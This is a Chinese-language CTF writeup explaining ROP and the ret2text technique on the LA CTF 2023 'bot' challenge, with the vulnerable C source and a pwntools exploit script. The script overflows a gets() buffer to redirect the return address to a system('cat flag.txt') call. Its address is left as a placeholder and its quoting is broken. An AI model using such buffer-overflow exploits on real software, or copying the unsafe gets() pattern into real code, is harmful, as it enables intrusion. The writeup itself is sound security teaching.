---
title: "CTF-PWN-栈溢出-基础 ROP - [ret2text]"
date: "2023-11-12 11:36:02 +0800"
categories:
  - "CTF 与 Pwn"
tags:
  - "学习"
  - "安全"
  - "Pwn"
  - "CTF"
  - "ROP"
series: "CTF Writeup"
excerpt: "volatile 关键字是一种类型修饰符，它提醒编译器其后定义的变量随时可能改变，因此编译后的程序每次需要存储或读取该变量时，都会直接从变量地址中读取数据。开启 NX 保护后，无法再直接向栈或堆中注入代码，因此目前使用 ROP（Return Oriented Programming，返回导向编程）来绕过保护。如果 gadget 的地址每次并不固定，就需要想办法动态获取对应的地址。我们可以找到合适的 gadget 及其对应的 gadget 地址。也就是说，在返回时，程序执行的是程序自身的代码（.text 段）"
source: "CSDN"
original_url: "https://blog.csdn.net/llovewuzhengzi/article/details/134357085"
csdn_article_id: "134357085"
migrated: true
---

{% raw %}
# ROP
开启 NX 保护后，无法再直接向栈或堆中注入代码，因此目前使用 ROP（Return Oriented Programming，返回导向编程）来绕过保护

要求：
程序存在溢出，因此可以控制返回地址
可以找到合适的 gadget 及其对应的 gadget 地址
如果 gadget 的地址每次并不固定，就需要想办法动态获取对应的地址

# ret2text
也就是说，在返回时，程序执行的是程序自身的代码（.text 段）

# LA CTF 2023 【bot】

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(void) {
  setbuf(stdout, NULL);
  char input[64];
  volatile int give_flag = 0;
  puts("hi, how can i help?");
  gets(input);
  if (strcmp(input, "give me the flag") == 0) {
    puts("lol no");
  } else if (strcmp(input, "please give me the flag") == 0) {
    puts("no");
  } else if (strcmp(input, "help, i have no idea how to solve this") == 0) {
    puts("L");
  } else if (strcmp(input, "may i have the flag?") == 0) {
    puts("not with that attitude");
  } else if (strcmp(input, "please please please give me the flag") == 0) { //成立
    puts("i'll consider it");    
    sleep(15);
    if (give_flag) {  //溢出修改give_flag的值
      puts("ok here's your flag");
      system("cat flag.txt");
    } else {
      puts("no");
    }
  } else {
    puts("sorry, i didn't understand your question");
    exit(1);
  }
}
```

volatile 关键字是一种类型修饰符，它提醒编译器其后定义的变量随时可能改变，因此编译后的程序每次需要存储或读取该变量时，都会直接从变量地址中读取数据。

局部变量从上到下依次压栈：先定义的先入栈

gets 溢出无法覆盖到 give_flag

> set var $pc=0x555555555160 修改寄存器的值
> set {int}0x83040 = 4 修改某处内存的内容

exp

```python
from pwn import*
context(os="linux",arch="amd64",log_level="debug")

f=process("./llk")
gdb.attach(f,"b main")
s=ELF("./llk")

payload=b"please please please give me the flag\x00".ljust(64+8,b"a")+b"system("cat flag.txt")的地址"
f.sendlineafter(b"hi, how can i help?\n",payload)
f.recv()
f.interactive()

```
{% endraw %}
